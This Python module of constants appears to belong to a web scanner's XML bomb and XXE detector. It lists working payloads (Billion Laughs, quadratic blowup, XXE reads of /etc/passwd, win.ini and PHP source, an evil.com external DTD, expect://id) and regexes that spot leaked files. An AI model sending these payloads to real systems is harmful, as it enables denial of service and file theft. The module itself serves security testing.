"""Constants and payloads for XML bomb detection."""

import re

__all__ = [
    "XML_BOMB_DETECTOR_SPEC",
    "XML_EXTENSIONS",
    "XML_CONTENT_TYPES",
    "XML_PATH_HINTS",
    "XML_DECLARATION_RE",
    "BASE64_PHP_RE",
    "BOOT_INI_RE",
    "ETC_PASSWD_RE",
    "WIN_INI_RE",
    "FILE_CONTENT_LEAK_RE",
    "BILLION_LOUGHS_PAYLOAD",
    "QUADRATIC_BLOWUP_PAYLOAD",
    "XXE_FILE_READ_PAYLOAD",
    "XXE_WINDOWS_PAYLOAD",
    "XXE_PHP_FILTER_PAYLOAD",
    "XXE_EXTERNAL_DTD_PAYLOAD",
    "XXE_BLIND_PAYLOAD",
    "XXE_EXPECT_PAYLOAD",
    "XXE_NETDOC_PAYLOAD",
    "XML_BOMB_PAYLOADS",
    "XML_ERROR_PATTERNS",
    "XML_PARSER_DISCLOSURE_PATTERNS",
    "XXE_SUCCESS_PATTERNS",
    "TIMEOUT_THRESHOLD_SECONDS",
]

XML_BOMB_DETECTOR_SPEC = {
    "key": "xml_bomb_detector",
    "label": "XML Bomb / Entity Expansion Detector",
    "description": "Detect XML entity expansion (Billion Laughs, Quadratic Blowup) and XXE vulnerabilities in XML-processing endpoints.",
    "group": "active",
    "slug": "xml_bomb_detector",
    "enabled_by_default": True,
}

XML_EXTENSIONS = frozenset(
    {".xml", ".soap", ".wsdl", ".svc", ".aspx", ".xslt", ".xsl", ".config", ".xsd"}
)

XML_CONTENT_TYPES = frozenset(
    {
        "application/xml",
        "text/xml",
        "application/soap+xml",
        "application/xhtml+xml",
        "application/atom+xml",
        "application/rss+xml",
        "application/x-www-form-urlencoded",
    }
)

XML_PATH_HINTS = frozenset(
    {
        "/soap",
        "/ws",
        "/webservice",
        "/xmlrpc",
        "/api/xml",
        "/feed",
        "/rss",
        "/atom",
        "/sitemap",
        "/xml",
        "/wsdl",
        "/svc",
        "/xslt",
        "/transform",
    }
)

XML_DECLARATION_RE = re.compile(r"<\?xml\s+version", re.IGNORECASE)

BILLION_LOUGHS_PAYLOAD = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE bomb ["
    '<!ENTITY a "0">'
    '<!ENTITY b "&a;&a;">'
    '<!ENTITY c "&b;&b;">'
    '<!ENTITY d "&c;&c;">'
    '<!ENTITY e "&d;&d;">'
    '<!ENTITY f "&e;&e;">'
    '<!ENTITY g "&f;&f;">'
    '<!ENTITY h "&g;&g;">'
    '<!ENTITY i "&h;&h;">'
    '<!ENTITY j "&i;&i;">'
    "]><root>&j;</root>"
)

QUADRATIC_BLOWUP_PAYLOAD = '<?xml version="1.0"?><root>' + "A" * 200000 + "</root>"

XXE_FILE_READ_PAYLOAD = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE root ["
    '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
    "]><root>&xxe;</root>"
)

XXE_WINDOWS_PAYLOAD = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE root ["
    '<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">'
    "]><root>&xxe;</root>"
)

XXE_PHP_FILTER_PAYLOAD = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE root ["
    '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">'
    "]><root>&xxe;</root>"
)

XXE_EXTERNAL_DTD_PAYLOAD = (
    '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://evil.com/xxe.dtd"><root>test</root>'
)

XXE_BLIND_PAYLOAD = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE root ["
    '<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">'
    "%dtd;"
    "]><root>test</root>"
)

XML_ERROR_PATTERNS = [
    re.compile(r"entity\s*(?:expansion|reference)", re.IGNORECASE),
    re.compile(r"DOCTYPE", re.IGNORECASE),
    re.compile(r"SAXParseException", re.IGNORECASE),
    re.compile(r"XMLParser", re.IGNORECASE),
    re.compile(r"ExternalEntity", re.IGNORECASE),
    re.compile(r"entity\s*resolution", re.IGNORECASE),
    re.compile(r"failed\s*to\s*load\s*external", re.IGNORECASE),
    re.compile(r"billion\s*laughs", re.IGNORECASE),
    re.compile(r"quadratic\s*blowup", re.IGNORECASE),
    re.compile(r"entity\s*expansion\s*limit", re.IGNORECASE),
    re.compile(r"XML\s*Entity\s*Expansion", re.IGNORECASE),
    re.compile(r"too\s*many\s*entities", re.IGNORECASE),
    re.compile(r"entity\s*recursion", re.IGNORECASE),
]

XML_PARSER_DISCLOSURE_PATTERNS = [
    re.compile(r"libxml2", re.IGNORECASE),
    re.compile(r"Xerces", re.IGNORECASE),
    re.compile(r"MSXML", re.IGNORECASE),
    re.compile(r"Expat", re.IGNORECASE),
    re.compile(r"Woodstox", re.IGNORECASE),
    re.compile(r"Saxon", re.IGNORECASE),
    re.compile(r"JAXB", re.IGNORECASE),
    re.compile(r"DOMParser", re.IGNORECASE),
    re.compile(r"SAXParser", re.IGNORECASE),
    re.compile(r"XMLReader", re.IGNORECASE),
]

XXE_SUCCESS_PATTERNS = [
    re.compile(r"root:[x*]?:0:0:"),
    re.compile(r"\[boot\s*loader\]", re.IGNORECASE),
    re.compile(r";\s*for\s*16-bit\s*app\s*support", re.MULTILINE),
    re.compile(r"^[a-z0-9_-]+:[x*]:\d+:\d+:", re.MULTILINE),
]

TIMEOUT_THRESHOLD_SECONDS = 8.0

# Additional regex patterns for XXE detection
BASE64_PHP_RE = re.compile(r"base64-encode\s+resource=", re.IGNORECASE)
BOOT_INI_RE = re.compile(r"\[boot\s*loader\]", re.IGNORECASE)
ETC_PASSWD_RE = re.compile(r"root:[x*]?:0:0:")
WIN_INI_RE = re.compile(r";\s*for\s*16-bit\s*app\s*support", re.MULTILINE)
FILE_CONTENT_LEAK_RE = re.compile(
    r"(?:root:[x*]?:0:0:|\[boot\s*loader\]|;\s*for\s*16-bit\s*app\s*support|<\?php\s|<\?xml\s)",
    re.IGNORECASE | re.MULTILINE,
)

# Additional XXE payloads
XXE_EXPECT_PAYLOAD = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE root ["
    '<!ENTITY % dtd SYSTEM "expect://id">'
    "%dtd;"
    "]><root>test</root>"
)

XXE_NETDOC_PAYLOAD = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE root ["
    '<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">'
    "]><root>&xxe;</root>"
)

# Combined XML bomb payloads list
XML_BOMB_PAYLOADS = [
    ("billion_laughs", BILLION_LOUGHS_PAYLOAD),
    ("quadratic_blowup", QUADRATIC_BLOWUP_PAYLOAD),
    ("xxe_file_read", XXE_FILE_READ_PAYLOAD),
    ("xxe_windows", XXE_WINDOWS_PAYLOAD),
    ("xxe_php_filter", XXE_PHP_FILTER_PAYLOAD),
    ("xxe_external_dtd", XXE_EXTERNAL_DTD_PAYLOAD),
    ("xxe_blind", XXE_BLIND_PAYLOAD),
    ("xxe_expect", XXE_EXPECT_PAYLOAD),
    ("xxe_netdoc", XXE_NETDOC_PAYLOAD),
]
